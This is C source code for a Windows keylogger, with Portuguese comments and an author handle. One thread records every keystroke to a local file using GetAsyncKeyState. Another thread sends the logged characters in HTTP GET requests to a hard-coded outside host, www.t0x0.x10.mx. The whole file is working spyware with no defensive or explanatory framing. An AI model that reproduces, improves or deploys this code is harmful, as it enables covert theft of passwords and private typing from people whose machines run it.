/*************
*By: Teuzero *
**************/
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "Ws2_32.lib")

#define DEFAULT_PORT 80
#pragma comment(lib, "cmcfg32.lib")
DWORD WINAPI _POSTWeb(char *postBuffer);

/*
 Função que captura as teclas
*/
DWORD WINAPI _vkCode(LPVOID unused){

	short character;
	char fileName[32]= "oi.txt";
	int buffer, j = 0;
	
	FILE *file = fopen(fileName,"a+");
	
	while(1)
	{				
		for(character=8;character<=222;character++)
		{
			if(GetAsyncKeyState(character)==-32767)
			{
				printf("%c",character);
				FILE *file;
				file=fopen(fileName,"a+");
				if(file!=NULL)
				{
					if((character>=39)&&(character<=64))
					{
						fputc(character,file);
						fclose(file);
						break;
					}else if((character>64)&&(character<91))
					{
						character+=32;
						fputc(character,file);
						fclose(file);
						break;
					}else
					{
						switch(character)
						{
					
							case VK_SPACE:
								fputc(' ',file);
								fclose(file);

							break;
							
							case VK_SHIFT:
								fputs("[SHIFT]",file);
								fclose(file);
							break;
							
							case VK_RETURN:
								fputs("[ENTER]",file);
								fclose(file);

							break;
							
							case VK_BACK:
								fputs("[BACKSPACE]",file);
								fclose(file);
							break;
							
							case VK_TAB:
								fputs("[TAB]",file);
								fclose(file);
							break;
							
							case VK_CONTROL:
								fputs("[CTRL]",file);
								fclose(file);
							break;
							
							case VK_DELETE:
								fputs("[DEL]",file);
								fclose(file);
							break;
							
							case VK_OEM_1:
								fputs("[;:]",file);
								fclose(file);
							break;
							
							case VK_OEM_2:
								fputs("[/?]",file);
								fclose(file);
							break;
							
							case VK_OEM_3:
								fputs("[`~]",file);
								fclose(file);
							break;
							
							case VK_OEM_4:
								fputs("[ [{ ]",file);
								fclose(file);
							
							break;
							
							case VK_OEM_5:
								fputs("[\\|]",file);
								fclose(file);
							break;
							
							case VK_OEM_6:
								fputs("[ ]} ]",file);
								fclose(file);
							break;
							
							case VK_OEM_7:
								fputs("['\"]",file);
								fclose(file);
							break;
							
							case 187:
								fputc('+',file);
								fclose(file);
							break;
							
							case 188:
								fputc(',',file);
								fclose(file);
							break;
							
							case 189:
								fputc('-',file);
								fclose(file);
							break;
							
							case 190:
								fputc('.',file);
								fclose(file);
							break;
							
							case VK_NUMPAD0:
								fputc('0',file);
								fclose(file);
							break;
							
							case VK_NUMPAD1:
								fputc('1',file);
								fclose(file);
							break;
							
							case VK_NUMPAD2:
								fputc('2',file);
								fclose(file);
							break;
							
							case VK_NUMPAD3:
								fputc('3',file);
								fclose(file);
							break;
							
							case VK_NUMPAD4:
								fputc('4',file);
								fclose(file);
							break;
							
							case VK_NUMPAD5:
								fputc('5',file);
								fclose(file);
							break;
							
							case VK_NUMPAD6:
								fputc('6',file);
								fclose(file);
							break;
							
							case VK_NUMPAD7:
								fputc('7',file);
								fclose(file);
							break;
							
							case VK_NUMPAD8:
								fputc('8',file);
								fclose(file);
							break;
							
							case VK_NUMPAD9:
								fputc('9',file);
								fclose(file);
							break;
							
							case VK_CAPITAL:
								fputs("[CAPS LOCK]",file);
								fclose(file);
							break;
		
							default:
								fclose(file);
							break;
						}
					}
				}
			}
		}
	}
}

/*Função que envia requesição 
	para página web
*/	
DWORD WINAPI _GETWeb(char *postBuffer){
	char buffer[10000];
	
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		printf ("\nWSAStartup failed.\n");
		return 1;
	}
	SOCKET Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	struct hostent *host;
	host = gethostbyname("www.t0x0.x10.mx");
	SOCKADDR_IN SockAddr;
	SockAddr.sin_port = htons(DEFAULT_PORT);
	SockAddr.sin_family = AF_INET;
	SockAddr.sin_addr.s_addr = *((unsigned long*)host->h_addr);
	
	printf("Connecting...\n");
	if (connect(Socket, (SOCKADDR*)(&SockAddr), sizeof(SockAddr)) != 0){
		printf("Could not connect");
		return 1;
	}
	printf("Connected.\n");
	
	char get_http[10000];
	
	memset(get_http, 0, 10000);
	
	sprintf(get_http,"GET /val-t0x0.php?textname=%s HTTP/1.1\r\nHost:www.t0x0.x10.mx \r\n\r\n%s\r\n",postBuffer);
	printf("%s",get_http);
	send(Socket,get_http,strlen(get_http), 0);	
	recv(Socket, buffer, 10000, 0);
	printf("%s",buffer);

	closesocket(Socket);
	WSACleanup();
	Sleep(3000);
	return 0;
}

/*Função que chama a Função _GETWeb
 para cada caracter lido no arquivo com fread.
*/

DWORD WINAPI _sendHttp(LPVOID unused){
		
	
	while(1){
		FILE *file = fopen("oi.txt","r");
		fseek(file,0,SEEK_END);
		int long tam = ftell(file);
		rewind(file);
		printf("%d",tam);
		
		char buffer[100000];
		
		while(!feof(file)){
			fread(buffer,1,1,file);
			_GETWeb(buffer);
		}
		fclose(file);
	}
}	


int main(){
	DWORD id[2];
	HANDLE th[2];
	
	/* 
		Cria duas threads, uma para capturar as teclas, e
		outra para enviar para página web.
	*/
	th[1] = CreateThread(0,0,_vkCode,0,0,&id[0]);
	th[0] = CreateThread(0,0,_sendHttp,0,0,&id[1]);
	
	if(th[0] ==0 || th[1] == 0){
		printf("\n Impossivel criar thread");
		exit(1);
	}
	
	WaitForMultipleObjects(2,th,1,INFINITE);
	
	int i;
	for(i = 0; i <2;i++){
		TerminateThread(th[i],0);
		CloseHandle(th[i]);
	}	
}
